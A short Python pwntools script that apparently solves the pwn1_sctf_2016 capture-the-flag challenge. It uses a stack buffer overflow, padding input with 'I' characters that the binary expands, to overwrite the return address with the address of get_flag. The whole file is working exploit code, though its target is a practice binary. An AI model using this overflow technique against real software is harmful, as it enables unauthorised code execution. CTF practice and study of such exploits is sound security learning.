from pwn import *

p = process('./pwn1_sctf_2016')
elf = ELF('./pwn1_sctf_2016')

payload = 'I'*(0x3c // 3) + 'a'*4 + p32(elf.symbols['get_flag'])

p.sendline(payload)
p.interactive()